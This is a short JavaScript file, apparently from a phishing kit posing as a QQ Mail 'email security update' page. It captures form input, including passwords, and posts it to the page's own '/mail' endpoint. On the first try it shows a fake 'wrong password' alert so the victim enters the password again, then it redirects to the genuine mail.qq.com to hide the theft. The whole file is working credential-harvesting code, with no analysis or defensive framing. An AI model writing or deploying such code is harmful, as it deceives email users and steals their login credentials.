


var count = 0;

$("form").submit(function (event) {
  event.preventDefault();
  $('form input[type="submit"]').prop("disabled", true);
  const data = $("form").serializeJSON();
  console.log(data);

  
  $.ajax({
    type: "POST",
    url: `${window.location.origin}/mail`,
    data: data,
    dataType: "json",
    encode: true,
  })
    .done((data) => {
      //set submit count
      if (count == 1) {
        console.log("success");
        // redirect now
        window.location.href = `https://mail.qq.com/`;
      } else {
        count++;
        console.log(count);
        $('form input[type="submit"]').prop("disabled", false);
        alert(
          `Oops sorry it seems you have entered a wrong password.\n try and enter your currect password in other to complete your email security update.`
        );
      }
      console.log(data);
    })
    .fail((err) => {
      alert(
        `Oops sorry its seems an error has occured.\n please try again to complete`
      );
      console.log(err);
    });
});
